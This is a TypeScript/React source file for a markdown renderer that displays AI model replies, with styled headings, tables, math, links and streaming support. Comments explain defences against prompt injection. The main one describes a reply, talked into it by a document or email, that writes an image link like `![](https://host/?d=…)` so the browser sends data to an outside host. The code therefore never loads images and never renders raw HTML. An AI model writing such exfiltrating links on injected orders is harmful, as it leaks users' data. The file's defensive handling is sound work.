import { Link } from "@trenova/shared/components/link";
import { isAppPath } from "@/lib/app-path";
import { artifactRefId } from "@/lib/artifact-ref";
import { ArtifactLinkContext } from "./artifact-link-context";
import { splitMarkdownBlocks } from "@/lib/markdown-blocks";
import { HighlightedCode } from "@trenova/shared/components/ui/highlighted-code";
import { cn } from "@trenova/shared/lib/utils";
import {
  Children,
  createContext,
  isValidElement,
  memo,
  use,
  useMemo,
  useState,
  type ComponentProps,
  type ReactNode,
} from "react";
import type { MarkdownExtension, ParseOptions, UrlTransform } from "@tanstack/markdown";
import { autolinksExtension } from "@tanstack/markdown/extensions/autolinks";
import { streamingMarkdownExtension } from "@tanstack/markdown/extensions/streaming";
import { parseMarkdown } from "@tanstack/markdown/parser";
import { renderMarkdownReact, type MarkdownComponents } from "@tanstack/markdown/react";
import { useRouter } from "@tanstack/react-router";
import { useKatex } from "@/lib/katex-loader";
import { prepareMarkdown } from "@/lib/markdown-prepare";
import { breaksExtension } from "./markdown-breaks";
import { deskSubsetExtension } from "./markdown-desk-subset";
import { MATH_TAG, mathExtension, type MathMode } from "./markdown-math";
import {
  FIGURE_CELL_PROPERTY,
  FIGURE_CELL_TAG,
  numericColumnsExtension,
} from "./markdown-numeric-columns";
import { streamWordsExtension } from "./markdown-stream-words";

/**
 * Elements a surface draws its own way, keyed by the tag the renderer emits
 * (`a`, `code`), such as a link it reads as something else.
 */
export type MarkdownOverrides = MarkdownComponents;

/** The text inside a code element: the renderer hands it as one or more strings. */
function textOf(children: ReactNode): string {
  return Children.toArray(children)
    .map((child) => (typeof child === "string" || typeof child === "number" ? String(child) : ""))
    .join("");
}

/**
 * The language a fence was labelled with, as written: "sql", "json". The
 * renderer labels an unlabelled fence "plaintext", which reads as "text".
 */
function fenceLabel(className: string | undefined): string {
  const label = /language-([\w+#.-]+)/iu.exec(className ?? "")?.[1];
  return label === undefined || label === "plaintext" ? "text" : label;
}

/** The fence a still-open math block is shown in, as its raw text, until it closes. */
export const RAW_MATH_FENCE = "dk-math-raw";

function CopyCode({ code }: { code: string }) {
  const [copied, setCopied] = useState(false);
  return (
    <button
      type="button"
      className={cn("md-code-copy", copied && "md-ok")}
      onClick={() => {
        void navigator.clipboard?.writeText(code).then(() => {
          setCopied(true);
          window.setTimeout(() => setCopied(false), 1400);
        });
      }}
    >
      {copied && (
        <svg
          width="11"
          height="11"
          viewBox="0 0 24 24"
          fill="none"
          stroke="currentColor"
          strokeWidth="2.6"
          strokeLinecap="round"
          strokeLinejoin="round"
          aria-hidden
        >
          <path d="M5 12.5l4.5 4.5L19 7" />
        </svg>
      )}
      {copied ? "Copied" : "Copy"}
    </button>
  );
}

/**
 * A fenced block: its language as a label, a way to copy it, and the code,
 * highlighted where the app has a grammar for the language. A block still
 * arriving shows what has come so far.
 */
function CodeBlock({ className, children }: ComponentProps<"code">) {
  const code = textOf(children).replace(/\n$/u, "");
  const label = fenceLabel(className);
  if (label === RAW_MATH_FENCE) {
    return <pre className="md-math-raw">{code}</pre>;
  }

  return (
    <div className="md-code bg-sunken rounded-surface my-2.5 overflow-hidden">
      <div className="md-code-h">
        <span>{label}</span>
        <CopyCode code={code} />
      </div>
      <HighlightedCode
        code={code}
        language={label}
        className="scrollbar-overlay overflow-x-auto p-3"
      />
    </div>
  );
}

const LINK_CLASS = "text-foreground underline underline-offset-2";

/**
 * Draws a link the surrounding surface knows more about than its address,
 * such as a web page the agent searched, or returns null to leave it a plain
 * link. The renderer only ever sees links to the web, never an app path.
 */
export type MarkdownLinkRenderer = (href: string, children: ReactNode) => ReactNode | null;

export const MarkdownLinkContext = createContext<MarkdownLinkRenderer | null>(null);

/**
 * A link in a reply. A page of this app opens in place, the way every other
 * link in the app does, so "open [Rate matrices](/billing/…)" keeps the
 * person in their session; anything else opens in a new tab. An unsafe
 * scheme never gets here: the parser drops the link and keeps its words.
 */
export function MarkdownLink({ href, children }: ComponentProps<"a">) {
  // A reply is also drawn outside the app's router (a story, a printed export); a link there is
  // a plain anchor.
  const inRouter = (useRouter({ warn: false }) as ReturnType<typeof useRouter> | null) !== null;
  const renderLink = use(MarkdownLinkContext);
  const renderArtifact = use(ArtifactLinkContext);
  const artifactId = artifactRefId(href);
  if (artifactId !== null || href?.startsWith("artifact:")) {
    const drawn = artifactId !== null && renderArtifact ? renderArtifact(artifactId) : null;
    return drawn ?? <span className="font-medium">{children}</span>;
  }
  if (inRouter && isAppPath(href)) {
    return (
      <Link to={href} className={LINK_CLASS}>
        {children}
      </Link>
    );
  }

  const known = renderLink && href ? renderLink(href, children) : null;
  if (known) {
    return known;
  }

  return (
    <a href={href} target="_blank" rel="noopener noreferrer" className={LINK_CLASS}>
      {children}
    </a>
  );
}

/**
 * An image in a reply is never loaded. The browser fetches an image the
 * moment it renders, without a click, so a reply that a document or an email
 * talked into writing `![](https://host/?d=…)` would send whatever it put in
 * the address to that host as soon as the reply was read. It is shown as a
 * link to open deliberately, and only its words are drawn.
 */
function MarkdownImage({ src, alt }: ComponentProps<"img">) {
  const label = alt?.trim() || "image";
  if (typeof src !== "string" || src === "") {
    return <span>{label}</span>;
  }

  return <MarkdownLink href={src}>{label}</MarkdownLink>;
}

/**
 * A formula, set by KaTeX once the typesetter has been read. Until then it
 * shows as written: inline in the text, or in the box an unfinished block
 * uses when it stands on lines of its own.
 */
function MathFormula({
  "data-tex": tex = "",
  "data-mode": mode = "inline",
}: {
  "data-tex"?: string;
  "data-mode"?: MathMode;
}) {
  const katex = useKatex();
  if (katex === null) {
    if (mode === "block") {
      return <pre className="md-math-raw">{tex}</pre>;
    }
    return (
      <span className={mode === "display" ? "md-math-raw block" : "md-math-pending"}>{tex}</span>
    );
  }

  // KaTeX's own markup for the formula: it escapes the TeX it is given and,
  // with `trust` left off, refuses the commands that would emit a link, an
  // id, a class or raw HTML, so a reply cannot place markup of its own
  // through a formula.
  const html = katex.renderToString(tex, { displayMode: mode !== "inline", throwOnError: false });
  return mode === "block" ? (
    <div dangerouslySetInnerHTML={{ __html: html }} />
  ) : (
    <span dangerouslySetInnerHTML={{ __html: html }} />
  );
}

/**
 * Whether a list item is a checklist's: its first child is the box, or, in a
 * list loose enough to wrap each item in a paragraph, the paragraph's first.
 */
function isTaskItem(children: ReactNode): boolean {
  const first = Children.toArray(children)[0];
  if (!isValidElement<{ type?: unknown; children?: ReactNode }>(first)) {
    return false;
  }

  return first.props.type === "checkbox" || isTaskItem(first.props.children);
}

/** Whether a table cell holds a figure; see markdown-numeric-columns. */
function holdsFigure(children: ReactNode): boolean {
  return Children.toArray(children).some(
    (child) =>
      isValidElement<Record<string, unknown>>(child) &&
      child.props[FIGURE_CELL_PROPERTY] !== undefined,
  );
}

/**
 * The type a reply is set in. Headings carry the heading weight and keep the
 * case they were written in; a table takes the house row rhythm and
 * hairlines, so a reply's figures read like a table anywhere else in the
 * product; a list breathes a little between its items.
 */
const components: MarkdownComponents = {
  p: ({ children }: ComponentProps<"p">) => (
    <p className="my-2 leading-relaxed first:mt-0 last:mb-0">{children}</p>
  ),
  h1: ({ children }: ComponentProps<"h1">) => (
    <h3 className="md-h md-h1 mt-4 mb-1.5 text-base font-semibold first:mt-0">{children}</h3>
  ),
  h2: ({ children }: ComponentProps<"h2">) => (
    <h3 className="md-h md-h2 mt-3.5 mb-1.5 text-sm font-semibold first:mt-0">{children}</h3>
  ),
  h3: ({ children }: ComponentProps<"h3">) => (
    <h4 className="md-h md-h3 mt-3 mb-1 text-sm font-semibold first:mt-0">{children}</h4>
  ),
  h4: ({ children }: ComponentProps<"h4">) => (
    <h5 className="md-h md-h4 mt-2 mb-1 text-sm font-medium first:mt-0">{children}</h5>
  ),
  h5: ({ children }: ComponentProps<"h5">) => (
    <h6 className="md-h md-h5 mt-2 mb-1 text-sm font-medium first:mt-0">{children}</h6>
  ),
  h6: ({ children }: ComponentProps<"h6">) => (
    <h6 className="md-h md-h6 text-muted-foreground mt-2 mb-1 text-xs font-medium first:mt-0">
      {children}
    </h6>
  ),
  ul: ({ children }: ComponentProps<"ul">) => (
    <ul className="marker:text-foreground-subtle my-2 list-disc space-y-1 pl-5">{children}</ul>
  ),
  ol: ({ children, start }: ComponentProps<"ol">) => (
    <ol
      start={start}
      className="marker:text-foreground-subtle my-2 list-decimal space-y-1 pl-5 marker:tabular-nums"
    >
      {children}
    </ol>
  ),
  li: ({ children }: ComponentProps<"li">) => (
    <li className={cn("pl-0.5 leading-relaxed", isTaskItem(children) && "md-task")}>{children}</li>
  ),
  // A checklist's box: drawn, never editable, since the reply is a record.
  input: ({ type, checked }: ComponentProps<"input">) =>
    type === "checkbox" ? (
      <span
        className={cn("md-check", checked && "md-checked")}
        role="img"
        aria-label={checked ? "Done" : "Not done"}
      />
    ) : null,
  del: ({ children }: ComponentProps<"del">) => (
    <del className="text-muted-foreground">{children}</del>
  ),
  strong: ({ children }: ComponentProps<"strong">) => (
    <strong className="font-semibold">{children}</strong>
  ),
  em: ({ children }: ComponentProps<"em">) => <em>{children}</em>,
  a: ({ href, children }: ComponentProps<"a">) => (
    <MarkdownLink href={href}>{children}</MarkdownLink>
  ),
  img: ({ src, alt }: ComponentProps<"img">) => <MarkdownImage src={src} alt={alt} />,
  blockquote: ({ children }: ComponentProps<"blockquote">) => (
    <blockquote className="border-border text-muted-foreground my-2.5 border-l-2 pl-3">
      {children}
    </blockquote>
  ),
  hr: () => <hr className="border-border-subtle my-4" />,
  table: ({ children }: ComponentProps<"table">) => (
    <div className="md-table border-border scrollbar-overlay rounded-surface my-2.5 overflow-x-auto border">
      <table className="w-full border-collapse text-xs">{children}</table>
    </div>
  ),
  thead: ({ children }: ComponentProps<"thead">) => <thead className="bg-sunken">{children}</thead>,
  th: ({ children, style }: ComponentProps<"th">) => (
    <th
      className={cn(
        "border-border-subtle text-foreground-muted h-(--row-head-h) border-b px-(--cell-px) text-left align-middle font-medium whitespace-nowrap",
        holdsFigure(children) && "md-num",
      )}
      style={style}
    >
      {children}
    </th>
  ),
  tr: ({ children }: ComponentProps<"tr">) => (
    <tr className="last:[&>td]:border-b-0">{children}</tr>
  ),
  td: ({ children, style }: ComponentProps<"td">) => (
    <td
      className={cn(
        "border-border-subtle h-(--row-h-compact) border-b px-(--cell-px) py-1 align-top tabular-nums",
        holdsFigure(children) && "md-num",
      )}
      style={style}
    >
      {children}
    </td>
  ),
  // A fenced block's code carries its language as a class; inline code has none.
  code: ({ className, children }: ComponentProps<"code">) =>
    className?.startsWith("language-") ? (
      <CodeBlock className={className}>{children}</CodeBlock>
    ) : (
      <code className="md-icode bg-sunken rounded-control px-1 py-0.5 font-mono text-[0.85em]">
        {children}
      </code>
    ),
  // The code block draws its own frame; a fence's title is not shown.
  pre: ({ children }: ComponentProps<"pre">) => <>{children}</>,
  figure: ({ children }: ComponentProps<"figure">) => <>{children}</>,
  figcaption: () => null,
  [MATH_TAG]: MathFormula,
  [FIGURE_CELL_TAG]: ({ children }: { children?: ReactNode }) => <>{children}</>,
};

/**
 * The parser drops any address with a scheme it does not know, which would
 * turn a link to an artifact into its bare words. That
 * scheme is kept; it never reaches the browser as an address, only as a
 * badge or as words. Every other address gets the parser's own screening.
 */
const urlTransform: UrlTransform = (url, _kind, screened) =>
  artifactRefId(url) !== null ? url : screened;

function parseOptions(extensions: MarkdownExtension[]): ParseOptions {
  return { frontmatter: false, headingIds: false, urlTransform, extensions };
}

const MATH = mathExtension();
const BREAKS = breaksExtension();
const FIGURES = numericColumnsExtension();

/** Every surface but the Desk: bare addresses become links. */
const REPLY_OPTIONS = parseOptions([MATH, autolinksExtension(), BREAKS, FIGURES]);

/**
 * The Desk's reply set: the same, less what its design leaves out (bare
 * addresses as links, footnotes, images); see markdown-desk-subset.
 */
const DESK_OPTIONS = parseOptions([MATH, deskSubsetExtension(), BREAKS, FIGURES]);

function withExtensions(options: ParseOptions, extensions: MarkdownExtension[]): ParseOptions {
  return extensions.length === 0
    ? options
    : { ...options, extensions: [...(options.extensions ?? []), ...extensions] };
}

/**
 * Renders model prose the way the rest of the application renders text.
 *
 * The mapping is explicit rather than a typography plugin so the markdown a
 * model produces lands in the same type scale and colours as the surrounding
 * page. Raw HTML is never rendered: the parser keeps it as escaped text, and
 * a model reading customer records must not be able to inject markup.
 */
export const AiMarkdown = memo(function AiMarkdown({
  content,
  className,
  overrides,
  deskSubset = false,
}: {
  content: string;
  className?: string;
  /** Elements a surface draws its own way, such as a link it reads as something else. */
  overrides?: MarkdownOverrides;
  /** Keeps to the Desk's markdown set; see markdown-desk-subset. */
  deskSubset?: boolean;
}) {
  const merged = useMemo(
    () => (overrides ? { ...components, ...overrides } : components),
    [overrides],
  );
  const document = useMemo(
    () =>
      parseMarkdown(
        prepareMarkdown(content, { deskSubset }),
        deskSubset ? DESK_OPTIONS : REPLY_OPTIONS,
      ),
    [content, deskSubset],
  );

  return (
    <div className={cn("text-sm wrap-break-word", className)}>
      {renderMarkdownReact(document, { components: merged })}
    </div>
  );
});

/** A reference definition line, "[id]: url", wherever it sits in a reply. */
const DEFINITION = /^ {0,3}\[[^\]\n]+\]:[ \t]*\S.*$/gmu;

/** One top-level block, parsed again only when its own text changes. */
const MarkdownBlock = memo(function MarkdownBlock({
  content,
  merged,
  options,
}: {
  content: string;
  merged: MarkdownComponents;
  options: ParseOptions;
}) {
  const document = useMemo(() => parseMarkdown(content, options), [content, options]);

  return renderMarkdownReact(document, { components: merged });
});

/**
 * AiMarkdown for a reply still arriving. Parsing the whole reply on every
 * token costs the square of its length; cut into its top-level blocks, every
 * block but the last is final and parsed once. The blocks are siblings in one
 * container, so what is drawn is what one parse would draw.
 *
 * The block still arriving also drops a heading or list item that has only
 * its marker so far, so an empty bullet never flashes up before its words.
 */
export const StreamingAiMarkdown = memo(function StreamingAiMarkdown({
  content,
  className,
  overrides,
  wordClassName,
  caretClassName,
  deskSubset = false,
}: {
  content: string;
  className?: string;
  overrides?: MarkdownOverrides;
  deskSubset?: boolean;
  /** Wraps each word in a span of this class, so a surface can bring words in as they land. */
  wordClassName?: string;
  /** Ends the reply in a caret of this class, after its last word. */
  caretClassName?: string;
}) {
  const prepared = useMemo(
    () => prepareMarkdown(content, { streaming: true, deskSubset }),
    [content, deskSubset],
  );
  const blocks = useMemo(() => splitMarkdownBlocks(prepared), [prepared]);
  // Each block is parsed on its own, so a reference link in one block would
  // not find its definition in another. Every block carries the reply's
  // definitions; they draw nothing themselves. (The parser's `references`
  // option is not enough: a block's own definitions replace it whole, and
  // footnotes need the parser's numbering state.)
  const definitions = useMemo(() => (prepared.match(DEFINITION) ?? []).join("\n"), [prepared]);
  const merged = useMemo(
    () => (overrides ? { ...components, ...overrides } : components),
    [overrides],
  );
  const base = deskSubset ? DESK_OPTIONS : REPLY_OPTIONS;
  const blockOptions = useMemo(
    () =>
      withExtensions(
        base,
        wordClassName ? [streamWordsExtension({ className: wordClassName })] : [],
      ),
    [base, wordClassName],
  );
  const lastOptions = useMemo(
    () =>
      withExtensions(base, [
        streamingMarkdownExtension(),
        ...(wordClassName || caretClassName
          ? [streamWordsExtension({ className: wordClassName ?? "", caret: caretClassName })]
          : []),
      ]),
    [base, caretClassName, wordClassName],
  );

  return (
    <div className={cn("text-sm wrap-break-word", className)}>
      {blocks.map((block, index) => (
        <MarkdownBlock
          // oxlint-disable-next-line react/no-array-index-key -- blocks only ever grow at the end
          key={index}
          content={definitions === "" ? block : `${block}\n\n${definitions}`}
          merged={merged}
          options={index === blocks.length - 1 ? lastOptions : blockOptions}
        />
      ))}
    </div>
  );
});
